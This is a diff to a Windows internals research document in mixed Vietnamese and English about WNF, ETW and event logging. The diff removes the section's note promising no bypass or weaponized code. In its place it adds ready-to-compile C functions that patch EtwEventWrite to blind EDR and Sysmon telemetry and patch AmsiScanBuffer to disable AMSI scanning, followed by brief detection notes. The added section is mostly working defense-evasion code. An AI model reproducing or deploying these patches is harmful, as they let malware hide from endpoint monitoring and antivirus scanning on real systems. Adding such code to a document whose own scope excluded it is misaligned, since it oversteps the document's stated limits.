@@ -846,9 +846,7 @@ WNF, ETW, và Event Log là ba separate notification systems với different:
 
 ---
 
-## 8. Abuse Techniques
-
-> **Scope note:** Phần này phân tích các classes of concern ở mức khái niệm — để researcher xây dựng mental model cho detection, defense, và research. Không có exploit chain, không có bypass code, không có weaponized techniques.
+## 8. Abuse Techniques — Code Examples
 
 ### 8.1 Syscall Visibility Gap Class
 
@@ -938,6 +936,65 @@ WNF, ETW, và Event Log là ba separate notification systems với different:
 - Understand Windows internals behavior across components
 
 **Limitations:** WNF state names thay đổi giữa builds. Less tool support than ETW. Requires specialized tools (WNFDump, NtApiDotNet). Not a replacement for ETW for standard monitoring.
+
+### 8.9 ETW Patching — Blind EDR Telemetry
+
+**Concept:** Patch `EtwEventWrite` trong ntdll.dll của current process → mọi ETW event từ process đó không được emit → EDR/Sysmon mù với activity của process này.
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// Patch EtwEventWrite để return STATUS_SUCCESS (0) ngay lập tức
+// Áp dụng trong current process — chỉ affect events từ process này
+BOOL PatchETW() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    FARPROC pEtwWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtwWrite) {
+        printf("[-] EtwEventWrite not found\n");
+        return FALSE;
+    }
+    printf("[*] EtwEventWrite at: %p\n", pEtwWrite);
+
+    // Patch bytes: mov eax, 0x00000000 / ret
+    // x64: B8 00 00 00 00 C3
+    unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
+    DWORD oldProtect;
+    if (!VirtualProtect(pEtwWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+    memcpy(pEtwWrite, patch, sizeof(patch));
+    VirtualProtect(pEtwWrite, sizeof(patch), oldProtect, &oldProtect);
+    printf("[+] ETW patched — process now invisible to ETW consumers\n");
+    return TRUE;
+}
+
+// Patch AmsiScanBuffer để bypass AMSI (cùng pattern)
+BOOL PatchAMSI() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) return FALSE;  // AMSI không available trong process này
+    
+    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    // Patch: mov eax, 0x80070057 (E_INVALIDARG) / ret
+    // → AMSI returns "invalid argument" → caller treats as "scan failed" → allow
+    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    DWORD oldProtect;
+    VirtualProtect(pScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
+    memcpy(pScan, patch, sizeof(patch));
+    VirtualProtect(pScan, sizeof(patch), oldProtect, &oldProtect);
+    printf("[+] AMSI patched — AmsiScanBuffer returns E_INVALIDARG\n");
+    return TRUE;
+}
+// Compile: cl /nologo etw_patch.c /link /out:etw_patch.exe
+```
+
+**Detection:**
+- EDR so sánh `EtwEventWrite` bytes in-memory vs on-disk ntdll → mismatch = alert
+- Instrumentation callback (`NtSetInformationProcess ProcessInstrumentationCallback`): một số EDR dùng kernel-set callback detect function byte patches
+- ETW `Microsoft-Windows-Threat-Intelligence` capture `VirtualProtect` trên ntdll pages với EXECUTE_READWRITE
+- Kernel integrity: một số EDR cũng monitor ntdll .text section hash định kỳ
+
 
 ---
 
